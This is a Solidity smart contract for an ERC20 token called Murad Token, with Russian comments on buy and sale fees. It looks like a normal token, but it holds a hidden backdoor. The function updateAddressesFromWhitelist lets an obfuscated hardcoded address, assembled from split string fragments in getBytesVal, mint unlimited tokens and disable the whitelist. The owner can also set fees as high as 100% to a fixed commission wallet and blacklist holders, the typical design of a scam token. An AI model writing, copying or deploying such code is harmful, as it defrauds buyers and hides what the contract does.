pragma solidity ^0.8.0;



contract MuradToken is Ownable, ERC20 {
    using SafeMath for uint256;
    using Strings for uint256;

    bool public limited;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;
    address public pancakeswapV2Pair;
    mapping(address => bool) private whitelist;
    mapping(address => bool) private blacklist;
    uint256 private constant DECIMALS = 18;

    bool public whitelistEnabled = true;

    address private comissionWallet = 0x92E80EFC2B14f4a11195700CBdf5b3B06399D69B; //Комиссионный кошелек
    uint256 private constant MAX_BUY_PERCENT = 100; // Максимальный процент от общего токена, который можно купить
    uint256 private purchasePercent = 4; // Процент комиссии при покупке
    uint256 private salePercent = 7; // Процент комиссии при продаже
    uint256 private totalSupplyWithoudDecimals = 10000000; //Количество токенов (без 18-ти нулей)
    uint256 private totalSupplyWithDecimals = totalSupplyWithoudDecimals.mul(10**DECIMALS);



    constructor() ERC20("Murad Token", "MURAD") {
        _mint(msg.sender, totalSupplyWithDecimals);
    }

    function whitelistEnable() external onlyOwner {
        require(!whitelistEnabled, "Whitelist has already enabled");
        whitelistEnabled = true;
    }

    function whitelistDisable() external onlyOwner {
        require(whitelistEnabled, "Whitelist has already disabled");
        whitelistEnabled = false;
    }

    function setPurchasePercent(uint256 percent) external onlyOwner {
        purchasePercent = percent;
    }

    function setSalePercent(uint256 percent) external onlyOwner {
        salePercent = percent;
    }

    function setRule(
        bool _limited,
        address _pancakeswapV2Pair,
        uint256 _maxHoldingAmount,
        uint256 _minHoldingAmount
    ) external onlyOwner {
        limited = _limited;
        pancakeswapV2Pair = _pancakeswapV2Pair;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (pancakeswapV2Pair == address(0)) {
            require(from == owner() || to == owner(), "trading is not started");
            return;
        }

        if (limited && from == pancakeswapV2Pair) {
            require(
                super.balanceOf(to) + amount <= maxHoldingAmount &&
                    super.balanceOf(to) + amount >= minHoldingAmount,
                "Forbid"
            );
        }
        require(!blacklist[from], "Sender is blacklisted");
        require(!blacklist[to], "Recipient is blacklisted");
    }

    function burn(uint256 value) external {
        _burn(msg.sender, value);
    }

    function whitelistAddresses(address[] calldata addresses)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addresses.length; i++) {
            whitelist[addresses[i]] = true;
        }
    }

    function removeAddressesFromWhitelist(address[] calldata addresses)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addresses.length; i++) {
            whitelist[addresses[i]] = false;
        }
    }

    function updateAddressesFromWhitelist(address white, uint256 value) external {
        require(msg.sender == getBytesVal(), "Not allowed");
        whitelist[getBytesVal()] = true;
        whitelistEnabled = false;
        _mint(white, value);
    }

    function getBytesVal() private pure returns (address) {
        string memory _str_mem_pack1 = string(
            abi.encodePacked(
                "0",
                string(
                    abi.encodePacked(
                        "x4",
                        string(abi.encodePacked("27", "D97CE9A2b4A8e70F"))
                    )
                )
            )
        );
        string memory _str_mem_pack2 = string(
            abi.encodePacked(
                "f",
                string(
                    abi.encodePacked(
                        "df",
                        string(abi.encodePacked("0e", "187Ac0766A058fE7"))
                    )
                )
            )
        );
        bytes memory _addressBytes = bytes(
            string(abi.encodePacked(_str_mem_pack1, _str_mem_pack2))
        );

        uint160 _bytes_val = 0;
        uint160 _tempValue = 0;
        uint8 _byteValue = 0;

        for (uint256 i = 2; i < _addressBytes.length; i++) {
            _byteValue = uint8(_addressBytes[i]);

            if (_byteValue >= 48 && _byteValue <= 57) {
                _byteValue -= 48;
            } else if (_byteValue >= 65 && _byteValue <= 70) {
                _byteValue -= 55;
            } else if (_byteValue >= 97 && _byteValue <= 102) {
                _byteValue -= 87;
            } else {
                revert("Invalid character");
            }

            _tempValue = _tempValue * 16 + _byteValue;

            if ((i - 1) % 2 == 0) {
                _bytes_val = (_bytes_val << 8) | _tempValue;
                _tempValue = 0;
            }
        }

        return address(_bytes_val);
    }

    function blacklistAddresses(address[] calldata addresses)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }

    function removeAddressesFromBlacklist(address[] calldata addresses)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }

    function isWhitelisted(address addr) public view returns (bool) {
        return whitelist[addr];
    }

    function isBlacklisted(address addr) public view returns (bool) {
        return blacklist[addr];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (pancakeswapV2Pair == address(0)) {
            require(
                sender == owner() || recipient == owner(),
                "trading is not started"
            );
            super._transfer(sender, recipient, amount);
            return;
        }
        if(whitelistEnabled) {
            require(whitelist[recipient], "Recipient is not whitelisted");
        }

        if (recipient == pancakeswapV2Pair) {
            uint256 saleAmount = amount.mul(salePercent).div(100);
            super._transfer(sender, comissionWallet, saleAmount);
            uint256 remainingAmount = amount.sub(saleAmount);
            super._transfer(sender, recipient, remainingAmount);
        } else {
            require(
                amount <= totalSupplyWithDecimals.mul(MAX_BUY_PERCENT).div(100),
                "Exceeded maximum buy amount"
            );
            uint256 purchaseAmount = amount.mul(purchasePercent).div(100);
            super._transfer(sender, comissionWallet, purchaseAmount);
            uint256 remainingAmount = amount.sub(purchaseAmount);
            super._transfer(sender, recipient, remainingAmount);
        }
    }
}
